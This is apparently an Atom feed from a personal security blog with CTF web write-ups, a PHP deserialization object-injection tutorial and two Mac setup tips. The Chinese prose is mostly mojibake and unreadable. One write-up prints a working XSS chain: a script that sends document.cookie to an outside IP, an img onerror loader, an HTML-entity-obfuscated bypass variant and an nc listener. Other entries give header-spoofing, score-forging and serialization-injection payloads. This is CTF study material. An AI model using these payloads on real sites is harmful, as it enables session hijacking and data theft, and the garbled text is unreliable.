title="è¿™é¢˜æ˜¯èµ›åå¤ç°çš„"></a>è¿™é¢˜æ˜¯èµ›åå¤ç°çš„</h4><p>é¦–å…ˆè¿›è¡Œfuzzï¼Œè¿™é‡Œè¿‡æ»¤äº†<code>&lt;&gt;</code>ä¸­çš„å†…å®¹ã€<code>script</code>ã€<code>iframe</code>ç­‰ï¼Œå¹¶ä¸”æ‰€æœ‰å­—æ¯ä¼šè¢«å¤§å†™</p><p>4.js</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var image=new Image();</span><br><span class="line">image.src=&quot;http://118.25.36.154:10006/cookies.phpcookie=&quot;+document.cookie;</span><br></pre></td></tr></table></figure><p>åŸå§‹payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://118.25.36.154/4.js&apos;;//</span><br></pre></td></tr></table></figure><p>ç”±äºå°–æ‹¬å·ä¸èƒ½ä¸¤ä¸ªåŒæ—¶å­˜åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>&lt;</code>ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬é—­åˆã€‚å‡½æ•°æˆ‘ä»¬å¯ä»¥ä½¿ç”¨htmlç¼–ç ç»•è¿‡ã€‚</p><p><code>//</code>çš„åŸå› æ˜¯è¦æ³¨é‡Šæ‰æ’å…¥èŠå¤©æ¡†åçš„<code>&lt;span&gt;</code></p><p>bypass payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=S=&amp;#x63;&amp;#x72;&amp;#x65;&amp;#x61;&amp;#x74;&amp;#x65;&amp;#x45;&amp;#x6c;&amp;#x65;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;(&quot;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&quot;);&amp;#x62;&amp;#x6f;&amp;#x64;&amp;#x79;.&amp;#x61;&amp;#x70;&amp;#x70;&amp;#x65;&amp;#x6e;&amp;#x64;&amp;#x43;&amp;#x68;&amp;#x69;&amp;#x6c;&amp;#x64;(S);S.&amp;#x73;&amp;#x72;&amp;#x63;=&quot;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x73;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2e;&amp;#x63;&amp;#x68;&amp;#x69;&amp;#x6e;&amp;#x61;&amp;#x63;&amp;#x79;&amp;#x63;&amp;#x63;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6d;&amp;#x2f;&amp;#x35;&amp;#x45;&amp;#x33;&amp;#x45;&amp;#x4d;&amp;#x49;&quot;&amp;#x2f;&amp;#x2f;</span><br></pre></td></tr></table></figure><p>ç„¶åncç›‘å¬</p><p><img src="http://images.xianyu123.club/Cosmos_chat1.png" alt></p><p>æœ€åæ›¿æ¢tokenå³å¯è·å¾—flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;hgame2020-Level-Week2_Web_writeup&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0clickjacking0.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>hgame2020-Level-Week1_Web_writeup</title>
    <link href="http://0clickjacking0.github.io/2020/01/25/hgame2020-Level-Week1_Web_writeup/"/>
    <id>http://0clickjacking0.github.io/2020/01/25/hgame2020-Level-Week1_Web_writeup/</id>
    <published>2020-01-25T13:47:00.000Z</published>
    <updated>2020-01-25T13:55:03.656Z</updated>
    
    <content type="html"><![CDATA[<p>hgame2020-Level-Week1_Web_writeup</p><a id="more"></a><h1 id="Level-Week1"><a href="#Level-Week1" class="headerlink" title="Level - Week1"></a>Level - Week1</h1><h2 id="Cosmos-çš„åšå®¢"><a href="#Cosmos-çš„åšå®¢" class="headerlink" title="Cosmos çš„åšå®¢"></a>Cosmos çš„åšå®¢</h2><p>åˆšå¼€å§‹ä»¥ä¸ºæ˜¯gitæ³„æ¼ï¼Œç„¶åéœ€è¦å›æ»šï¼Œå‘ç°å¹¶æ²¡æœ‰ï¼Œç„¶åå†æ¬¡è®¿é—®<code>.git/config</code>ï¼Œå‘ç°äº†ä¸€ä¸ª<code>github</code>åœ°å€</p><p><img src="http://images.xianyu123.club/cosmos1.png" alt></p><p>ç„¶åè·Ÿè¿›è®¿é—®è¿™ä¸ª<code>github</code>ï¼ŒæŸ¥çœ‹<code>commits</code>ï¼Œå‘ç°flagåœ¨è¿™é‡Œ</p><p><img src="http://images.xianyu123.club/cosmos2.png" alt></p><p>base64è§£ç <code>aGdhbWV7ZzF0X2xlQGtfMXNfZGFuZ2VyMHVzXyEhISF9</code>ï¼Œå¾—åˆ°flag<code>hgame{g1t_le@k_1s_danger0us_!!!!}</code></p><h2 id="æ¥-å¤´-éœ¸-ç‹"><a href="#æ¥-å¤´-éœ¸-ç‹" class="headerlink" title="æ¥ å¤´ éœ¸ ç‹"></a>æ¥ å¤´ éœ¸ ç‹</h2><p>ä»é¢˜ç›®åå­—æ¥çœ‹å¯èƒ½æ˜¯æƒ³è®©æˆ‘ä»¬åœ¨headerå¤´ä¸­ä¼ å…¥ä¿¡æ¯ï¼Œæ‰“å¼€é¢˜ç›®åï¼Œé¢˜ç›®ä¸­è¯´<code>You need to come from https://vidar.club/.</code></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¢åŠ ä¸Š<code>Referer: https://vidar.club/</code></p><p>æ ¹æ®è¿”å›åŒ…çš„å†…å®¹ï¼Œå¯èƒ½éœ€è¦locationè®¿é—®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¢åŠ <code>X-Forwarded-For: 127.0.0.1</code></p><p><img src="http://images.xianyu123.club/jietou1.png" alt></p><p>æ ¹æ®è¿”å›åŒ…çš„å†…å®¹ï¼Œéœ€è¦ç”¨<code>Cosmos</code>æµè§ˆå™¨è®¿é—®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¢åŠ <code>User-Agent: Cosmos</code></p><p><img src="http://images.xianyu123.club/jietou2.png" alt></p><p>æ ¹æ®è¿”å›åŒ…çš„å†…å®¹ï¼Œéœ€è¦åœ¨2077å¹´æ‰èƒ½è®¿é—®ï¼Œè¿™è®©æˆ‘æƒ³èµ·äº†ä¸­ç§‘å¤§2019çš„é‚£é“é¢˜ç›®ï¼Œæˆ‘ä»¬å¢åŠ <code>if-unmodified-since: Fri, 01 Jan 2077 00:00:00 GMT</code></p><p>å…·ä½“çš„ç”¨æ³•å¯å‚è€ƒ<a href="https://www.cnblogs.com/memset/p/http_if_modified_since.html" target="_blank" rel="noopener">HTTP/1.1 ä¸­ If-Modified-Since å’Œ If-Unmodified-Since åŒºåˆ«ç®€è®°</a></p><p><img src="http://images.xianyu123.club/jietou3.png" alt></p><p>ç„¶åå°±å¯ä»¥å¾—åˆ°flagäº†</p><p><img src="http://images.xianyu123.club/jietou4.png" alt></p><h2 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h2><p>è¿™é¢˜ç¡®å®æ˜¯è‡ªå·±å¤ªèœäº†ï¼Œé—®äº†å­¦å¼Ÿå’Œå…¶ä»–ä¸¤ä¸ªå¸ˆå‚…æ‰æƒ³åˆ°ã€‚</p><p>é¦–å…ˆæŠ“åŒ…ï¼Œå‘ç°æœ‰ä¸€ä¸ª302è·³è½¬ï¼Œç„¶åæŠ“å–<code>index.php</code>çš„é¡µé¢ï¼Œæç¤º405é”™è¯¯</p><p><img src="http://images.xianyu123.club/code_world1.png" alt></p><p>è¿™ä¸ªä¸€èˆ¬éƒ½æ˜¯è¯·æ±‚æ–¹æ³•é”™è¯¯ï¼Œæ”¹æˆpostï¼Œæç¤ºéœ€è¦ä¼ å…¥aå‚æ•°</p><p><img src="http://images.xianyu123.club/code_world2.png" alt></p><p>ç„¶åä¼ å…¥å‚æ•°a=<code>2%2b8</code>ï¼ˆè¿™é‡Œç»è¿‡å¸ˆå‚…ä»¬çš„æé†’æ‰æƒ³èµ·æ¥ï¼‰ï¼Œ<code>+</code>åœ¨urlåœ°å€ä¸­æ˜¯ç©ºæ ¼ï¼Œéœ€è¦ç¼–ç æ‰èƒ½æ˜¾ç¤º<code>+</code></p><p><img src="http://images.xianyu123.club/code_world3.png" alt></p><h2 id="ğŸ”å°¼æ³°ç«"><a href="#ğŸ”å°¼æ³°ç«" class="headerlink" title="ğŸ”å°¼æ³°ç«"></a>ğŸ”å°¼æ³°ç«</h2><p>å…³é”®ä»£ç åœ¨<code>game.js</code>ä¸­çš„<code>gameOver()</code>å‡½æ•°ä¸­ï¼Œå¦‚ä¸‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">gameOver() &#123;</span><br><span class="line"><span class="keyword">let</span> po = <span class="string">"ejIy"</span>;</span><br><span class="line"><span class="keyword">let</span> rt = po + <span class="string">"LmNj"</span>;</span><br><span class="line"><span class="keyword">let</span> rou = <span class="string">"L3N1Ym"</span>;</span><br><span class="line"><span class="keyword">let</span> sche = <span class="string">"aHR0c"</span>;</span><br><span class="line"><span class="keyword">let</span> k = <span class="string">"c2Nv"</span>;</span><br><span class="line"><span class="keyword">let</span> me = sche + <span class="string">"DovL2N"</span>;</span><br><span class="line">clearInterval(<span class="keyword">this</span>.timer)</span><br><span class="line"><span class="keyword">this</span>.context.clearRect(<span class="number">0</span>, <span class="number">0</span>, <span class="keyword">this</span>.canvas.width, <span class="keyword">this</span>.canvas.height)</span><br><span class="line"><span class="keyword">let</span> stamp = md5(<span class="built_in">Date</span>.parse(<span class="keyword">new</span> <span class="built_in">Date</span>()) / <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">this</span>.globalScore = <span class="keyword">this</span>.globalScore + <span class="keyword">this</span>.storageScore;</span><br><span class="line"><span class="keyword">this</span>.context.font = <span class="string">'32px Microsoft YaHei'</span></span><br><span class="line"><span class="keyword">this</span>.context.fillStyle = <span class="string">'#000'</span></span><br><span class="line"><span class="keyword">this</span>.context.fillText(<span class="string">'CXKï¼Œä½ çƒæ‰äº†ï¼å¾—åˆ†ï¼š'</span> + <span class="keyword">this</span>.globalScore, <span class="number">404</span>, <span class="number">226</span>)</span><br><span class="line">$(<span class="string">"#ballspeedset"</span>).removeAttr(<span class="string">"disabled"</span>);</span><br><span class="line"><span class="keyword">let</span> s = <span class="keyword">this</span>.globalScore;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> getU = me + <span class="string">"4ay5oZ"</span>;</span><br><span class="line"><span class="keyword">let</span> rl = getU + <span class="string">"2FtZS53"</span>;</span><br><span class="line"><span class="keyword">let</span> te = rou + <span class="string">"1pdA"</span>;</span><br><span class="line"><span class="keyword">let</span> ey = k + <span class="string">"cmU="</span>;</span><br><span class="line">$.post(atob(rl + rt + te), atob(ey) + <span class="string">"="</span> + s + <span class="string">"|"</span> + stamp, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">alert(data);</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="keyword">this</span>.globalScore = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ç¬¬22è¡Œï¼Œè¿™é‡Œpostä¼ è¾“çš„ç½‘å€ä¸º<code>http://cxk.hgame.wz22.cc/submit</code>ï¼Œå‚æ•°åä¸º<code>score=</code>ï¼Œå‚æ•°å€¼ä¸º<code>åˆ†æ•°(å¤§äº30000)</code>ã€<code>|</code>ã€<code>stamp(åœ¨ç¬¬10è¡Œ)</code>ä¸‰éƒ¨åˆ†ç»„æˆï¼Œç„¶åæ„é€ ä¼ è¾“å³å¯</p><p><img src="http://images.xianyu123.club/jntm1.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;hgame2020-Level-Week1_Web_writeup&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0clickjacking0.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>è§£å†³macä¸‹sshè‡ªåŠ¨ä¸­æ–­é—®é¢˜</title>
    <link href="http://0clickjacking0.github.io/2020/01/14/%E8%A7%A3%E5%86%B3mac%E4%B8%8Bssh%E8%87%AA%E5%8A%A8%E4%B8%AD%E6%96%AD%E9%97%AE%E9%A2%98/"/>
    <id>http://0clickjacking0.github.io/2020/01/14/è§£å†³macä¸‹sshè‡ªåŠ¨ä¸­æ–­é—®é¢˜/</id>
    <published>2020-01-14T11:20:45.000Z</published>
    <updated>2020-01-14T11:24:29.452Z</updated>
    
    <content type="html"><![CDATA[<p>è§£å†³macä¸‹sshè‡ªåŠ¨ä¸­æ–­é—®é¢˜</p><a id="more"></a><h2 id="é‡åˆ°çš„é—®é¢˜"><a href="#é‡åˆ°çš„é—®é¢˜" class="headerlink" title="é‡åˆ°çš„é—®é¢˜"></a>é‡åˆ°çš„é—®é¢˜</h2><p>macä¸‹sshè¿æ¥ä¹‹åï¼Œå¦‚æœé•¿æ—¶é—´æ²¡æœ‰æ“ä½œï¼ŒæœåŠ¡å™¨ä¼šè‡ªåŠ¨æ–­å¼€è¿™ä¸ªè¿æ¥ï¼Œä¹Ÿå°±æ˜¯sshå®¢æˆ·ç«¯ä¼šå¡ä½ï¼Œä¸èƒ½è¾“å…¥ã€‚</p><h2 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h2><p>åœ¨<code>~/.ssh/config</code>ï¼ˆå¦‚æœæ²¡æœ‰<code>config</code>æ–‡ä»¶æ–°å»ºä¸€ä¸ªå³å¯ï¼‰ä¸­å†™å…¥ä¸‹é¢å†…å®¹ï¼Œä¿å­˜å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServerAliveInterval 30</span><br></pre></td></tr></table></figure><p>æ¯éš”30ç§’ï¼Œmacå®¢æˆ·ç«¯ä¼šä¸»åŠ¨å‘æœåŠ¡å™¨å‘å‡ºä¸€æ¬¡è¯·æ±‚ã€‚è¿™æ ·å°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜äº†</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è§£å†³macä¸‹sshè‡ªåŠ¨ä¸­æ–­é—®é¢˜&lt;/p&gt;
    
    </summary>
    
      <category term="mac" scheme="http://0clickjacking0.github.io/categories/mac/"/>
    
    
  </entry>
  
  <entry>
    <title>macä¸‹å®‰è£…consolaså­—ä½“</title>
    <link href="http://0clickjacking0.github.io/2020/01/14/mac%E4%B8%8B%E5%AE%89%E8%A3%85consolas%E5%AD%97%E4%BD%93/"/>
    <id>http://0clickjacking0.github.io/2020/01/14/macä¸‹å®‰è£…consolaså­—ä½“/</id>
    <published>2020-01-14T10:30:31.000Z</published>
    <updated>2020-01-16T12:44:51.780Z</updated>
    
    <content type="html"><![CDATA[<p>macä¸‹å®‰è£…consolaså­—ä½“</p><a id="more"></a><h2 id="å®‰è£…è¿‡ç¨‹"><a href="#å®‰è£…è¿‡ç¨‹" class="headerlink" title="å®‰è£…è¿‡ç¨‹"></a>å®‰è£…è¿‡ç¨‹</h2><ol><li><code>mkdir consolas</code></li><li><code>cd consolas</code></li><li><code>curl -LO https://sourceforge.net/projects/mscorefonts2/files/cabs/PowerPointViewer.exe</code></li><li><code>cabextract PowerPointViewer.exe</code></li><li><code>cabextract ppviewer.cab</code></li><li><code>open CONSOLA*.TTF</code></li></ol><p>ç„¶åå°±å¯ä»¥å¿«ä¹çš„ä½¿ç”¨<code>consolas</code>å­—ä½“å•¦</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;macä¸‹å®‰è£…consolaså­—ä½“&lt;/p&gt;
    
    </summary>
    
      <category term="mac" scheme="http://0clickjacking0.github.io/categories/mac/"/>
    
    
  </entry>
  
  <entry>
    <title>phpååºåˆ—åŒ–ä¸­çš„å¯¹è±¡é€ƒé€¸</title>
    <link href="http://0clickjacking0.github.io/2019/12/17/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E5%AF%B9%E8%B1%A1%E9%80%83%E9%80%B8/"/>
    <id>http://0clickjacking0.github.io/2019/12/17/phpååºåˆ—åŒ–ä¸­çš„å¯¹è±¡é€ƒé€¸/</id>
    <published>2019-12-17T08:15:08.000Z</published>
    <updated>2019-12-18T13:48:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>phpååºåˆ—åŒ–ä¸­çš„å¯¹è±¡é€ƒé€¸çš„å­¦ä¹ </p><a id="more"></a><h1 id="phpä¸­çš„å‡ ä¸ªç‰¹æ€§"><a href="#phpä¸­çš„å‡ ä¸ªç‰¹æ€§" class="headerlink" title="phpä¸­çš„å‡ ä¸ªç‰¹æ€§"></a>phpä¸­çš„å‡ ä¸ªç‰¹æ€§</h1><ol><li>PHP åœ¨ååºåˆ—åŒ–æ—¶ï¼Œ<strong>å¯¹ç±»ä¸­ä¸å­˜åœ¨çš„å±æ€§ä¹Ÿä¼šè¿›è¡Œååºåˆ—åŒ–</strong></li></ol><p><img src="http://images.xianyu123.club/php_serialize_escape1.png" alt></p><ol start="2"><li>PHP åœ¨ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚ä»£ç æ˜¯ä»¥ <code>;</code> ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥ <code>}</code> ä½œä¸ºç»“å°¾(å­—ç¬¦ä¸²é™¤å¤–)ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹çš„</li><li>å¯¹äºç±»ä¼¼è¿™ç§<code>O:1:&quot;A&quot;:2:{s:1:&quot;a&quot;;s:3:&quot;123&quot;;s:1:&quot;b&quot;;s:9:&quot;xianyu123&quot;;}s:1:&quot;c&quot;;s:2:&quot;yes&quot;;</code>ä¹Ÿæ˜¯èƒ½å¤Ÿæ­£å¸¸ååºåˆ—åŒ–çš„ï¼Œå³ä½¿<code>s:2:&quot;yes&quot;</code>çš„é•¿åº¦ä¸åŒ¹é…ä¹Ÿä¸å½±å“ã€‚è¯´æ˜phpåœ¨ååºåˆ—åŒ–çš„æ—¶å€™åªè¦æ±‚ä¸€ä¸ªååºåˆ—åŒ–å­—ç¬¦ä¸²å—åˆæ³•å³å¯ï¼Œå½“ç„¶å¾—æ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²å—ã€‚</li></ol><p><img src="http://images.xianyu123.club/php_serialize_escape2.png" alt></p><h1 id="æ¼æ´äº§ç”Ÿçš„åŸå› "><a href="#æ¼æ´äº§ç”Ÿçš„åŸå› " class="headerlink" title="æ¼æ´äº§ç”Ÿçš„åŸå› "></a>æ¼æ´äº§ç”Ÿçš„åŸå› </h1><p>åºåˆ—åŒ–çš„å­—ç¬¦ä¸²åœ¨ç»è¿‡è¿‡æ»¤å‡½æ•°ä¸æ­£ç¡®çš„å¤„ç†è€Œå¯¼è‡´å¯¹è±¡æ³¨å…¥ï¼Œå› ä¸ºå…ˆè¿›è¡Œäº†åºåˆ—åŒ–ï¼Œå†è¿›è¡Œè¿‡æ»¤ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½ä¼šäº§ç”Ÿæ­¤æ¼æ´ã€‚</p><h1 id="Demoæ¼”ç¤º"><a href="#Demoæ¼”ç¤º" class="headerlink" title="Demoæ¼”ç¤º"></a>Demoæ¼”ç¤º</h1><h2 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($f)</span></span>&#123;</span><br><span class="line">    $filter = <span class="string">'/c/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">'bb'</span>,$f);</span><br><span class="line">&#125;</span><br><span class="line">$username = $_GET[<span class="string">'user'</span>];</span><br><span class="line">$password = <span class="string">"mypass"</span>;</span><br><span class="line">$user = <span class="keyword">array</span>($username, $password);</span><br><span class="line">var_dump(serialize($user));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">$r = filter(serialize($user));</span><br><span class="line">var_dump($r);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">var_dump(unserialize($r));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>user</code>å‚æ•°å¯æ§ï¼Œæˆ‘ä»¬å…ˆç»™å‡ºpayloadï¼š<code>xianyu123cccccccccccccccccccc&quot;;i:1;s:6:&quot;123456&quot;;}</code></p><p>ä»£ç ç¬¬4è¡Œï¼Œæ˜¯æŠŠ<code>c</code>æ›¿æ¢æˆä¸¤ä¸ª<code>b</code>ï¼Œè¿™æ ·çš„è¯æ¯æœ‰ä¸€ä¸ª<code>c</code>ï¼Œå°±å¯ä»¥å¤šå‡º1ä¸ªå­—ç¬¦ï¼Œç„¶åæˆ‘ä»¬çš„æ ¸å¿ƒä»£ç æ˜¯<code>&quot;;i:1;s:6:&quot;123456&quot;;}</code>ï¼Œé•¿åº¦ä¸º20ï¼Œç„¶åæˆ‘ä»¬åªéœ€è¦æ„é€ 20ä¸ª<code>c</code>å³å¯ã€‚</p><p><img src="http://images.xianyu123.club/php_serialize_escape4.png" alt></p><p>è¿™æ ·çš„è¯å°±å¯ä»¥è¦†ç›–æ‰æœ¬æ¥çš„<code>$password = &quot;mypass&quot;;</code>ï¼Œæ›¿æ¢æˆäº†æˆ‘ä»¬è‡ªå·±æƒ³è¦çš„å¯†ç ã€‚</p><p><img src="http://images.xianyu123.club/php_serialize_escape3.png" alt></p><h2 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h2><p>è¿™é‡Œæ¨¡æ‹Ÿä¸€ä¸ªç¯å¢ƒï¼Œå°±æ˜¯å¦‚ä½•è¦†ç›–æ‰<code>$account[&#39;g&#39;]</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($f)</span></span>&#123;</span><br><span class="line">    $filter = <span class="string">'/c/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$f);</span><br><span class="line">&#125;</span><br><span class="line">$account = [];</span><br><span class="line">$account[<span class="string">'u'</span>] = <span class="string">'admin'</span>;</span><br><span class="line">$account[<span class="string">'p'</span>] = <span class="string">'pass'</span>; </span><br><span class="line">extract($_GET);</span><br><span class="line">$account[<span class="string">'g'</span>] = <span class="string">'g7bk'</span>;</span><br><span class="line">var_dump(serialize($account));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">$r = filter(serialize($account));</span><br><span class="line">var_dump($r);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">var_dump(unserialize($r));</span><br></pre></td></tr></table></figure><p>å…ˆç»™å‡ºpayloadï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?account[u]=cccccccccccccccccccccccccccccccccccccccc&amp;account[p]=";s:1:"m";s:9:"xianyu123";s:1:"h";s:4:"hhhh";s:1:"g";s:4:"kkkk";&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬å…ˆä¸è¦çœ‹è¿‡æ»¤çš„ä»£ç </p><p>æ­£å¸¸æƒ…å†µä¸‹çš„åºåˆ—åŒ–ç»“æœä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">"u"</span>;s:<span class="number">40</span>:<span class="string">"cccccccccccccccccccccccccccccccccccccccc"</span>;s:<span class="number">1</span>:<span class="string">"p"</span>;s:<span class="number">65</span>:<span class="string">""</span>;s:<span class="number">1</span>:<span class="string">"m"</span>;s:<span class="number">9</span>:<span class="string">"xianyu123"</span>;s:<span class="number">1</span>:<span class="string">"h"</span>;s:<span class="number">4</span>:<span class="string">"hhhh"</span>;s:<span class="number">1</span>:<span class="string">"g"</span>;s:<span class="number">4</span>:<span class="string">"kkkk"</span>;&#125;<span class="string">";s:1:"</span>g<span class="string">";s:4:"</span>g7bk<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>ç»è¿‡è¿‡æ»¤å‡½æ•°åçš„åºåˆ—åŒ–ç»“æœä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">"u"</span>;s:<span class="number">40</span>:<span class="string">""</span>;s:<span class="number">1</span>:<span class="string">"p"</span>;s:<span class="number">65</span>:<span class="string">""</span>;s:<span class="number">1</span>:<span class="string">"m"</span>;s:<span class="number">9</span>:<span class="string">"xianyu123"</span>;s:<span class="number">1</span>:<span class="string">"h"</span>;s:<span class="number">4</span>:<span class="string">"hhhh"</span>;s:<span class="number">1</span>:<span class="string">"g"</span>;s:<span class="number">4</span>:<span class="string">"kkkk"</span>;&#125;<span class="string">";s:1:"</span>g<span class="string">";s:4:"</span>g7bk<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>u</code>çš„é•¿åº¦è™½ç„¶ä¸º40ï¼Œä½†æ˜¯å·²ç»æ²¡æœ‰äº†å†…å®¹ï¼Œæ‰€ä»¥ååºåˆ—åŒ–ä¼šè‡ªåŠ¨å¾€åè¯»å–40ä½</p><p><img src="http://images.xianyu123.club/php_serialize_escape6.png" alt></p><p>ä¼šè¯»å–åˆ°ä¸Šå›¾çš„ä½ç½®ï¼Œç„¶åç»“æŸã€‚å› ä¸º<code>u</code>çš„åºåˆ—åŒ–å†…å®¹è¯»å–æ•°æ®æ—¶éœ€è¦å¾€åå¡«å……40ä½ï¼Œå¯¼è‡´åé¢çš„<code>p</code>çš„å†…å®¹ä¹Ÿå‘ç”Ÿäº†æ”¹å˜ï¼Œåæ‰äº†å…¶åŒå¼•å·ï¼Œæ‰€ä»¥æ­¤æ—¶åé¢çš„<code>&quot;;s:1:&quot;g&quot;;s:4:&quot;g7bk&quot;;}</code>åœ¨ååºåˆ—åŒ–æ—¶å°±ä¼šè¢«å½“ä½œéæ³•å­—ç¬¦å¿½ç•¥æ‰ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥æ§åˆ¶<code>$account[&#39;g&#39;]</code>çš„å€¼ã€‚</p><p><img src="http://images.xianyu123.club/php_serialize_escape5.png" alt></p><h1 id="å®é™…ä¸­çš„æ¡ˆä¾‹åˆ†æ"><a href="#å®é™…ä¸­çš„æ¡ˆä¾‹åˆ†æ" class="headerlink" title="å®é™…ä¸­çš„æ¡ˆä¾‹åˆ†æ"></a>å®é™…ä¸­çš„æ¡ˆä¾‹åˆ†æ</h1><p>joomla3.0.0-3.4.6 å¯¹è±¡æ³¨å…¥å¯¼è‡´çš„ååºåˆ—åŒ–</p><h1 id="CTFä¸­çš„åˆ©ç”¨"><a href="#CTFä¸­çš„åˆ©ç”¨" class="headerlink" title="CTFä¸­çš„åˆ©ç”¨"></a>CTFä¸­çš„åˆ©ç”¨</h1><p>å®‰æ´µæ¯2019-easy_serialize_php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 